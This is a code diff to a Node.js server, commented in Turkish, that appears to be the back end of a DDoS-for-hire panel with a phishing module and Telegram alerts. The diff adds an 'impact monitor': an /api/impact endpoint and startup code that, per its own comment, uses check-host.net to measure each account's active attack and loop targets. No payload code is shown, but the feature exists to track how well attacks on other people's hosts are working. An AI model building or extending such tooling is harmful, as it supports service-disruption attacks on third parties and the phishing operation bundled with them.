@@ -15,6 +15,7 @@ const fs = require('fs');
 const path = require('path');
 const { sendTelegram, initTelegram, esc } = require('./telegram');
 const phish = require('./phish');
+const { initImpact, getImpactForUser } = require('./impact');
 
 initTelegram();
 
@@ -2482,6 +2483,24 @@ app.get('/api/check-host', async (req, res) => {
 });
 
 /**
+ * GET /api/impact
+ * Giris yapan hesabin takip edilen hedeflerinin etki olcumleri (Etki Monitoru).
+ */
+app.get('/api/impact', (req, res) => {
+  try {
+    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
+    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });
+    const username = sessions[sessionId]?.username;
+    if (!username) return res.status(401).json({ status: 'error', message: 'Invalid session' });
+
+    res.json({ status: 'success', targets: getImpactForUser(username) });
+  } catch (error) {
+    console.error('Impact error:', error.message);
+    res.status(500).json({ status: 'error', message: error.message });
+  }
+});
+
+/**
  * GET /api/ping-pe?host=...
  */
 app.get('/api/ping-pe', async (req, res) => {
@@ -2691,6 +2710,8 @@ app.get('/api/phish/stats', (req, res) => {
 
 // Load persisted sessions/loops before starting server
 loadState();
+// Etki Monitoru: aktif saldiri/loop hedeflerini check-host.net ile olcer.
+initImpact({ activeAttacks, activeLoops, sessions, getLoopOwner });
 // Restart sonrasi slot bildirimi kacmasin: geri yuklenen saldirilari hesap
 // bazinda baz al.
 Object.values(activeAttacks).forEach((a) => {
